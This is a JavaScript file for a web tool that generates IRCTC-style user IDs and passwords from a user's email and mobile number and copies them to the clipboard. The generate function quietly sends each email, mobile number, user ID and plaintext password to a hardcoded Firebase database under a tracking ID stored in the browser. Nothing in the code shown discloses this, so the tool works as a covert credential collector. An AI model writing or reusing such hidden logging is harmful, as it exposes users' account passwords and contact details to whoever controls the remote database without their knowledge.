/* 🔄 AUTO REFRESH AFTER 7 MINUTES */
setTimeout(()=>location.reload(),420000);

/* 🔥 FIREBASE CONFIG */
firebase.initializeApp({
  apiKey: "AIzaSyCrnG8iz_JUgqiG8zVStqKBpicOF4m2SB0",
  authDomain: "iruserid-5c557.firebaseapp.com",
  databaseURL: "https://iruserid-5c557-default-rtdb.firebaseio.com",
  projectId: "iruserid-5c557",
  storageBucket: "iruserid-5c557.firebasestorage.app",
  messagingSenderId: "234438715803",
  appId: "1:234438715803:web:2f254753f6b6827d6a193e"
});
const db = firebase.database();

/* 🧠 UNIQUE BROWSER ID */
let containerId = localStorage.getItem("containerId");
if(!containerId){
  containerId = "browser_" + Math.random().toString(36).slice(2,10);
  localStorage.setItem("containerId",containerId);
}

/* 🔐 IRCTC VALID PASSWORD (8–15) */
function generatePassword(){
  const upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const lower="abcdefghijklmnopqrstuvwxyz";
  const num="0123456789";
  const special="@#$%&*!";

  let pass =
    upper[Math.floor(Math.random()*upper.length)] +
    lower[Math.floor(Math.random()*lower.length)] +
    num[Math.floor(Math.random()*num.length)] +
    special[Math.floor(Math.random()*special.length)];

  const all = upper+lower+num+special;
  const len = Math.floor(8 + Math.random()*8); // 8–15

  while(pass.length < len){
    pass += all[Math.floor(Math.random()*all.length)];
  }

  return pass.split('').sort(()=>0.5-Math.random()).join('');
}

/* ⚡ GENERATE */
function generate(){
  const email=emailEl.value.trim();
  const mobile=mobileEl.value.trim();
  if(!email || !mobile){
    alert("Email & Mobile required");
    return;
  }

  const name=email.split("@")[0].replace(/[^a-zA-Z]/g,"").toLowerCase();
  const digits=Math.floor(10+Math.random()*90);
  const letters="abcdefghijklmnopqrstuvwxyz";
  const userId=name+digits+
    letters[Math.floor(Math.random()*26)]+
    letters[Math.floor(Math.random()*26)];

  const password=generatePassword();

  pass.value=password;
  userid.value=userId;
  phone.value=mobile;
  mailout.value=email;

  final.value=`${userId}\n${password}\n${mobile}\n${email}`;

  db.ref("users/"+containerId+"/activity").push({
    email,mobile,userid:userId,password,time:Date.now()
  });
}

/* 📋 COPY */
function copyText(btn,id){
  navigator.clipboard.writeText(document.getElementById(id).value);
  btn.classList.add("copied");
  setTimeout(()=>btn.classList.remove("copied"),2000);
}
function copyAll(btn){
  navigator.clipboard.writeText(final.value);
  btn.classList.add("copied");
  setTimeout(()=>btn.classList.remove("copied"),3000);
}

/* 🔗 SHORTCUTS */
const emailEl=email;
const mobileEl=mobile;
